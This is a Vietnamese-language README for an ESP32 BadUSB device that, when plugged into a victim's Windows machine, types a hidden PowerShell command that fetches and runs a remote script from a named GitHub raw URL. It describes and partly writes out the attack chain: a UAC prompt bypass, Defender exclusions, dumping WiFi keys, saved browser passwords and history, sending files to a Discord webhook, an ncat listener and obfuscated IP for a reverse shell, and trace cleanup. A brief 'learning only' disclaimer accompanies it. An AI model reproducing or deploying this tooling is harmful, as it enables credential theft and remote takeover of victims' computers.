# 🚀 ANM-Esp32BadUSB - Thiết bị BadUSB tấn công tự động (ESP32)

[![ESP32](https://img.shields.io/badge/ESP32-Lolin%20S2%20Mini-blue)](https://www.wemos.cc/en/latest/s2/s2_mini.html)
[![PlatformIO](https://img.shields.io/badge/PlatformIO-Arduino-orange)](https://platformio.org/)
[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)

## 📱 Giới thiệu

**ANM-Esp32BadUSB** là dự án **BadUSB** sử dụng **ESP32 Lolin S2 Mini** giả lập bàn phím HID để thực hiện **tấn công tự động** khi cắm vào máy nạn nhân (Windows). 

**Chức năng chính**:
- ✅ Nhấn nút **BOOT** để kích hoạt payload
- ✅ Tải & chạy script **PowerShell độc hại** từ GitHub
- ✅ **Dump dữ liệu**: WiFi passwords, browser history, saved passwords, connected devices
- ✅ **Exfiltration**: Gửi files qua **Discord webhook**
- ✅ **Reverse shell** về máy attacker (TCP port 6969)
- ✅ **Stealth**: Bypass UAC, ẩn cửa sổ, cleanup traces, bypass AV

**⚠️ CẢNH BÁO**: Chỉ sử dụng cho **mục đích học tập/ethical hacking**. Tuân thủ pháp luật!

## 🛠️ Yêu cầu

### Phần cứng
- ESP32 Lolin S2 Mini (hoặc tương thích TinyUSB)
- Cáp USB-C

### Phần mềm
- [VSCode](https://code.visualstudio.com/) + [PlatformIO IDE](https://platformio.org/install/ide)
- Serial Monitor (115200 baud)

## 📥 Cài đặt & Build

1. **Clone repo**:
   ```bash
   git clone <your-repo>
   cd ANM-Esp32BadUSB
   ```

2. **Mở bằng PlatformIO** (VSCode):
   - Cài extension PlatformIO nếu chưa có
   - Mở folder project

3. **Build & Flash**:
   ```bash
   pio run --target upload  # Flash firmware
   pio device monitor       # Serial monitor (115200 baud)
   ```

4. **Chọn board**: `lolin_s2_mini` (platformio.ini đã config sẵn)

## ⚙️ Cấu hình

### 1. Discord Webhook
- Chỉnh `$hookurl` trong `src/test2.ps1`:
  ```powershell
  $hookurl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN"
  ```

### 2. Reverse Shell IP
- Bên máy attacker (Có cài ncat) dùng lệnh: 
	```
    ncat -lvnp 6969
    ```
- Tìm dòng IP rối trong `test2.ps1`:
  ```powershell
  '1'+""+'9'+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+'2'+'.'+""+""+'1'+""+'6'+""+""+""+""+""+""+""+""+""+""+""+""+""+'8'+'.'+'2'+'.'+""+'4'+""+""+""+""+""+""+""+"";
  ```
- **Giải mã**: `192.168.2.4` → Thay bằng **IP máy attacker** (ví dụ: `192.168.1.100`)
- Port cố định: **6969**

### 3. Payload URL
- `main.cpp` tải `test2.ps1` từ:
  ```
  https://raw.githubusercontent.com/khangpdm/BadUSB/main/NEW/test2.ps1
  ```
- Thay link GitHub raw của bạn nếu cần

## 🎮 Hướng dẫn sử dụng

1. **Flash firmware** → Cắm ESP32 vào máy attacker để test Serial

2. **Serial output** (115200 baud):
   ```
   --- HỆ THỐNG BADUSB ĐÃ SẴN SÀNG ---
   [LOG] Chờ nhấn nút BOOT để bắt đầu tấn công...
   ```

3. **Tấn công**:
   - Cắm vào máy nạn nhân (như USB thường)
   - Nhấn & giữ **nút BOOT** (chân GPIO 0)
   - **LED sáng** + **Caps Lock nháy** = Thành công
   - Theo dõi Discord webhook nhận data

4. **Payload sequence** (`main.cpp`):
   ```
   1. Win+D (ẩn desktop)
   2. Win+R (Run dialog)
   3. powershell -w h ... | iex
   4. Ctrl+Shift+Enter (Run as Admin)
   5. Alt+Y (Bypass UAC)
   6. Caps Lock x4 (Hoàn tất)
   ```

## 🔍 Chi tiết Payload (test2.ps1)

```
1. Tạo C:\Users\[USER]\Downloads\scripts\[DUMP_FOLDER]
2. Tải tools.zip → Giải nén (4 tools dump)
3. Dump: WiFi, Passwords, History, Devices → Gửi Discord
4. Quét Downloads → Zip files nhạy cảm → Gửi Discord
5. Reverse shell TCP [IP]:6969
6. Cleanup: Xóa traces, history, exclusions
```

**Tools sử dụng**:
- WNetWatcher.exe (connected devices)
- BrowsingHistoryView.exe (history)
- WebBrowserPassView.exe (passwords)
- WirelessKeyView.exe (WiFi)

## 🐛 Troubleshooting

| Vấn đề | Giải pháp |
|--------|-----------|
| Không nhận USB | Kiểm tra driver ESP32, reset board |
| Serial không hiện | Baud 115200, chọn đúng port COM |
| UAC không bypass | Chạy test trên Win10/11 Home (ít UAC) |
| Payload fail | Kiểm tra GitHub raw URL public |
| Không dump | Thêm `Add-MpPreference -ExclusionPath` manual |

## 📹 Video Demo
*(User sẽ update sau)*

## 🚀 Tính năng nâng cao (Future)

- Multi-stage payload
- Persistence (startup)
- Keylogger
- Screenshot exfil
- Custom tools

## ⚖️ License & Disclaimer

- **MIT License** - Chỉ học tập
- **KHÔNG sử dụng** cho mục đích bất hợp pháp
- Tác giả: ANM Team
- Liên hệ: [Discord/GitHub]

---

**Happy Hacking! 🎉**

